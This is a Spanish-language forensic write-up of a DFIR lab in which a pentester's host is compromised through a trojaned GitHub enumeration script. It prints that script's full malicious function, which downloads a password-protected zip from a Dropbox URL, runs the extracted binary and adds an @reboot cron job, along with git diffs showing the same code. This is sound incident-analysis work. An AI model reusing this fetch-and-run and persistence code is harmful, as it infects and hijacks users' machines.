

# **Sherlock - Psittaciformes**

En este laboratorio estaremos analizando los ficheros de un ejercicio de `pentensting` en un entorno de producción, el reposte muestra que el equipo se que estaba analizando pudo haber sido comprometido, nuestro trabajo es determinar cómo y qué fue lo que pasó.

Se nos proporcionan los siguientes ficheros, un .zip que hay que descomprimir, dentro viene un .tar.gz que contiene el reporte: 

```bash 
┌──(root㉿kali)-[/home/kali/blue-labs/DFIR]
└─# ls -l                                      
total 25984
drw------- 11 kali kali     4096 Dec 23 17:33 catscale_out
-rw-rw-r--  1 kali kali 13345407 Dec 25 15:53 catscale_parrot_20241223-2233.tar.gz
-rw-rw-r--  1 kali kali 13254180 Apr 29 23:33 Psittaciformes.zip
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/kali/blue-labs/DFIR]
└─# cd catscale_out        
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/kali/blue-labs/DFIR/catscale_out]
└─# ls -l 
total 40
drwxr-xr-x 2 kali kali 4096 Dec 23 17:33 Docker
drwxr-xr-x 2 kali kali 4096 Dec 23 17:33 Logs
drwxr-xr-x 2 kali kali 4096 Dec 23 17:35 Misc
-rw-r--r-- 1 kali kali 1842 Dec 23 17:35 parrot-20241223-2233-console-error-log.txt
drwxr-xr-x 2 kali kali 4096 Dec 23 17:35 Persistence
drwxr-xr-x 2 kali kali 4096 Dec 23 17:33 Podman
drwxr-xr-x 2 kali kali 4096 Dec 23 17:35 Process_and_Network
drwxr-xr-x 2 kali kali 4096 Dec 23 17:35 System_Info
drwxr-xr-x 4 kali kali 4096 Apr 30 00:19 User_Files
drwxr-xr-x 2 kali kali 4096 Dec 23 17:33 Virsh
```

Con esto, podemos pasar brevemente a las preguntas. 

---
**task 1** 

¿Cuál es el nombre del repositorio utilizado por el Pen Tester dentro de Forela que resultó en el compromiso de su host?

Bien, para esto hay que navegar hasta la siguiente ruta y descomprimier los ficheros para acceder al historial del intérprete de comandos del usuario: 

```bash 
┌──(root㉿kali)-[/home/kali/blue-labs/DFIR/catscale_out]
└─# cd User_Files  
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/…/blue-labs/DFIR/catscale_out/User_Files]
└─# ls    
hidden-user-home-dir-list.txt  hidden-user-home-dir.tar.gz  home  root
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/…/blue-labs/DFIR/catscale_out/User_Files]
└─# cd home      
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/…/DFIR/catscale_out/User_Files/home]
└─# ls -l 
total 4
drwxr-xr-x 2 root root 4096 Apr 30 00:19 johnspire
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/…/DFIR/catscale_out/User_Files/home]
└─# cd johnspire 
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/…/catscale_out/User_Files/home/johnspire]
└─# ls -al 
total 424
drwxr-xr-x 2 root root   4096 Apr 30 00:19 .
drwxr-xr-x 3 root root   4096 Apr 30 00:19 ..
-rw-r--r-- 1 kali 1004    637 Dec 23 17:32 .bash_history
-rw-r--r-- 1 kali 1004   4665 Nov 22  2022 .bashrc
-rw-r--r-- 1 kali 1004     35 Sep  3  2024 .dmrc
-rwxr-xr-x 1 kali 1004    482 Nov 22  2022 .emacs
-rw-r--r-- 1 kali 1004     25 Nov 22  2022 .gdbinit
-rw-r--r-- 1 kali 1004 372127 Nov 22  2022 .gdbinit-gef.py
-rwxr-xr-x 1 kali 1004    536 Nov 22  2022 .gtkrc-2.0
-rwxr-xr-x 1 kali 1004    675 Nov 22  2022 .profile
-rwxr-xr-x 1 kali 1004     74 Nov 22  2022 .vimrc
-rw-r--r-- 1 kali 1004    159 Sep  3  2024 .Xauthority
-rw------- 1 kali 1004   6732 Dec 23 15:00 .xsession-errors
-rwxr-xr-x 1 kali 1004   1989 Nov 22  2022 .zshrc
```

En el historial de la terminal podemos ver lo siguiente: 
```bash 
exit
sudo service ssh start
exit
ip a
sudo service ssh start
ip a
exit
sudo nmap -p- 10.129.228.158
ls
history
nikto
nikto -h 10.129.228.158
ls
nmap 192.168.68.0/24
nmap 192.168.68.0/24 -p-
msfconsole
ls
cat /etc/passwd
passwd johnspire
ip a
ls
ping 1.1.1.1
git clone https://github.com/pttemplates/autoenum
cd autoenum/
ls
bash enum.sh 10.0.0.10
sudo bash enum.sh 10.0.0.10
cd 
ls
mkdir Git
cd Git/
ls
git clone https://github.com/enaqx/awesome-pentest
git clone https://github.com/F1shh-sec/Pentest-Scripts
ls
cd
mkdir PenTests
cd PenTests/
ls
cd
cd Desktop/
;s
ls
sudo openvpn forela-corp.ovpn 
sudo su
sudo openvpn forela-corp.ovpn 
```
1. **`https://github.com/pttemplates/autoenum`**
   - **Descripción:** Script de automatización para enumeración de red/servicios, típicamente usado en CTFs o pentests para escanear puertos y detectar servicios.
2. **`https://github.com/enaqx/awesome-pentest`**
   - **Descripción:** Una lista curada de herramientas de pentesting, no es un código ejecutable como tal, sino una colección de enlaces y recursos.
3. **`https://github.com/F1shh-sec/Pentest-Scripts`**
   - **Descripción:** Conjunto de scripts de pentesting, podría contener herramientas para explotación, escaneo, etc.


---
**task 2** 

En el historial no podemos ver los comandos utilizados para comprometer el sistema, asi que clonamos la herramienta utilizada, y nos encontramos el el siguiente escript: 

```bash 
do_wget_and_run() {
    f1="https://www.dropbox.com/scl/fi/uw8oxug0jydibnorjvyl2"
    f2="/blob.zip?rlkey=zmbys0idnbab9qnl45xhqn257&st=v22geon6&dl=1"
    OUTPUT_FILE="/tmp/.hidden_$RANDOM.zip"  
    UNZIP_DIR="/tmp/" 
    part1="c3VwZXI="
    part2="aGFja2Vy"
    PASSWORD=$(echo "$part1$part2" | base64 -d)  

    FILE_URL="${f1}${f2}"  

    echo "------------------------------------------------------------------------------"
    echo " System validation underway..."
    echo "------------------------------------------------------------------------------"
    echo "\n"

    # Download the file
    echo "Establishing connection to remote resource..."
    curl -L -o "$OUTPUT_FILE" "$FILE_URL"

    if [ $? -ne 0 ]; then
        echo "Error during retrieval process. Terminating."
        exit 1
    fi

    # Validate the downloaded file
    FILE_TYPE=$(file -b "$OUTPUT_FILE")
    if [[ "$FILE_TYPE" != *"Zip archive data"* ]]; then
        echo "Artifact does not match expected configuration. Exiting."
        exit 1
    fi

    echo "------------------------------------------------------------------------------"
    echo " Preparing extracted elements for deployment"
    echo "------------------------------------------------------------------------------"

    # Extract the ZIP file
    unzip -o -P "$PASSWORD" "$OUTPUT_FILE" -d "$UNZIP_DIR"

    if [ $? -ne 0 ]; then
        echo "Error during extraction process. Terminating."
        exit 1
    fi

    # Locate and execute the file
    BLOB_PATH="$UNZIP_DIR/blob"
    if [ -f "$BLOB_PATH" ]; then
        echo "------------------------------------------------------------------------------"
        echo " Finalizing deployment sequence"
        echo "------------------------------------------------------------------------------"
        chmod +x "$BLOB_PATH"
        "$BLOB_PATH"
        
        # Add a cron job to run the file at startup
        echo "------------------------------------------------------------------------------"
        echo " Adding to cron for startup execution"
        echo "--------------------------------------------------------------------------
        (crontab -l 2>/dev/null; echo "@reboot $BLOB_PATH") | crontab -
    else
        echo "Required component missing from extracted set. Terminating."
        exit 1
    fi
}

Un resumen de lo que hace la función `do_wget_and_run` 


1. **Descarga un archivo ZIP malicioso desde Dropbox**:
   - URL construida dinámicamente:  
     `https://www.dropbox.com/scl/fi/uw8oxug0jydibnorjvyl2/blob.zip?...`

2. **Guarda el ZIP con un nombre oculto y aleatorio en `/tmp`**:
   - Ejemplo: `/tmp/.hidden_12345.zip`

3. **Desencripta la contraseña del ZIP**:
   - Usa `base64` para obtener la contraseña.

4. **Verifica que el archivo es un ZIP** y **lo extrae**:
   - Extrae el contenido usando la contraseña hacia `/tmp/`.

5. **Busca un archivo llamado `blob` dentro del ZIP**:
   - Si existe, le da permisos de ejecución y **lo ejecuta directamente**.

6. **Persiste el binario ejecutado (`blob`) con un cronjob**:
   - Añade `@reboot /tmp/blob` al crontab del usuario → **ejecución en cada reinicio**.


---
**task 3**

¿Cuál es la contraseña del archivo zip descargado dentro de la función maliciosa?

Vamos a ver de qué contraseña se trata usando la terminal. 

```bash 
┌──(root㉿kali)-[/home/…/User_Files/home/johnspire/autoenum]
└─# part1="c3VwZXI="; part2="aGFja2Vy"; PASSWORD=$(echo "$part1$part2" | base64 -d) 
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/…/User_Files/home/johnspire/autoenum]
└─# echo $PASSWORD 
superhacker
```

---
**task 4**

¿Cuál es la URL completa del archivo descargado por el atacante?

Esto se define en las siguientes variables: 

```bash 
f1="https://www.dropbox.com/scl/fi/uw8oxug0jydibnorjvyl2"
f2="/blob.zip?rlkey=zmbys0idnbab9qnl45xhqn257&st=v22geon6&dl=1"
```

---
**task 5**

¿Cuándo quitó finalmente el atacante los comentarios reales de la función maliciosa?

Ya tenemos el repositorio clonado en nuestro equipo, podemos usar el siguiente comando para ver el historial de cambios: 


```bash 
┌──(root㉿kali)-[/home/…/User_Files/home/johnspire/autoenum]
└─# git log --pretty=oneline
786acdbe3804191556e971f6e2814ef34f571454 (HEAD -> main, origin/main, origin/HEAD) Update enum.sh
7d203152c5a3a56af3d57eb1faca67a3ec54135f Update enum.sh
553e18b0272f8dd5dc003b9f91a938aa68077f6b Update enum.sh
48e83bfda01bf69dc3b920600b541e99929b1a64 Update enum.sh
5d88bee8918d514a206fec91be72899544cdd37b Update enum.sh
07650e4833d4b037a99d0ae621344833e908a27c Update enum.sh
2ed69ee3525798ab197bdb1505e0d1d55af85832 Update enum.sh
e89644ae88559d4ea4639ef82ade834123793508 Update enum.sh
301ca43e68d0a9908ad4d52cbe603134de1de418 Update enum.sh
84097107492799db5fe5ba8d036a1b0fdfd6293f Update readme.md
6b2900adc68ca577f6abb3b474cecae2cf952a5e Update enum.sh
725834cb09a7483189a6d3ab4804d0797d06998b Create enum.sh
b4b26de857c77e2aaef71d8cc7f6367f79576e7c Create readme.md
```

Penseríamos que en penúltimos cambio fue cuando quitó los comentarios, revisemos con ese id:


```bash 
┌──(root㉿kali)-[/home/…/User_Files/home/johnspire/autoenum]
└─# git show 7d203152c5a3a56af3d57eb1faca67a3ec54135f
commit 7d203152c5a3a56af3d57eb1faca67a3ec54135f
Author: brown249 <85936721+brown249@users.noreply.github.com>
Date:   Mon Dec 23 22:27:58 2024 +0000

    Update enum.sh

diff --git a/enum.sh b/enum.sh
index 18f7b2e..5f685d8 100644
--- a/enum.sh
+++ b/enum.sh
@@ -65,25 +65,22 @@ do_dirb() {
 }
 
 do_wget_and_run() {
-    # Pieces for combining later (remote location for something)
     f1="https://www.dropbox.com/scl/fi/uw8oxug0jydibnorjvyl2"
     f2="/blob.zip?rlkey=zmbys0idnbab9qnl45xhqn257&st=v22geon6&dl=1"
-    OUTPUT_FILE="/tmp/.hidden_$RANDOM.zip"  # Temporary storage with randomized identifier
-    UNZIP_DIR="/tmp/"  # Destination for extracted items
-
-    # Decode hidden sequence (secure key for locked data)
+    OUTPUT_FILE="/tmp/.hidden_$RANDOM.zip"  
+    UNZIP_DIR="/tmp/" 
     part1="c3VwZXI="
     part2="aGFja2Vy"
-    PASSWORD=$(echo "$part1$part2" | base64 -d)  # Rebuild and unlock the access code
+    PASSWORD=$(echo "$part1$part2" | base64 -d)
```

Parece que el `2024-12-23 22:27:58` finalmente quitó los comanetarios de la función que nos interesa. 

---
**task 6**

El atacante cambió la URL para descargar el archivo, ¿cuál era antes del cambio?

Para esto podemos seguir explorando los cambios usando los ID: 

```bash 
┌──(root㉿kali)-[/home/…/User_Files/home/johnspire/autoenum]
└─# git show 5d88bee8918d514a206fec91be72899544cdd37b
commit 5d88bee8918d514a206fec91be72899544cdd37b
Author: brown249 <85936721+brown249@users.noreply.github.com>
Date:   Mon Dec 23 22:23:41 2024 +0000

    Update enum.sh

diff --git a/enum.sh b/enum.sh
index 4588988..0a97220 100644
--- a/enum.sh
+++ b/enum.sh
@@ -65,7 +65,7 @@ do_dirb() {
 }
 
 do_wget_and_run() {
-    FILE_URL="https://www.dropbox.com/scl/fi/wu0lhwixtk2ap4nnbvv4a/blob.zip?rlkey=gmt8m9e7bd02obueh9q3voi5q&st=em7ud3pb&dl=1"
+    FILE_URL="https://www.dropbox.com/scl/fi/uw8oxug0jydibnorjvyl2/blob.zip?rlkey=zmbys0idnbab9qnl45xhqn257&st=v22geon6&dl=1"
     OUTPUT_FILE="/tmp/blob.zip"
     UNZIP_DIR="/tmp/"
```

---
**task 7**

¿Cuál es la técnica MITRE ID utilizada por el atacante para persistir?

Bien, para esto no es tan díficil encontrar la técnica, se logra persistencia añadiendo una tarea progragama al `crontab` para que se ejecute en cada inicio del sisitema: 

![](../assets/images/sherlock-psitta/imagen1.png)


---
**task 8**

¿Cuál es el Mitre Att&ck ID para la técnica relevante para el binario que ejecuta el atacante?

Para esto hay que analizar un poco más el binario `blob` descargado por el atacante, y podremos llegar a la conclusión de que se trata de la técnica: 


![](../assets/images/sherlock-psitta/imagen2.png)

1. El binario `blob` se ejecuta automáticamente en segundo plano y **se persiste con `cron`**, por lo tanto corre en **cada reinicio del sistema**.
   
2. Se oculta (se descarga en `/tmp`, archivo oculto, nombre genérico) → **comportamiento típico de mineros o malware persistente.**

3. Se entrega mediante un ZIP con contraseña desde un repositorio comprometido → patrón común de distribución de malware como **criptojacking miners**.

4. El hecho de que el laboratorio relacione `blob` con **T1496 (Resource Hijacking)** implica que este binario está usando los recursos de la máquina víctima **para algún propósito que no beneficia al usuario** (por ejemplo, minería de criptomonedas).

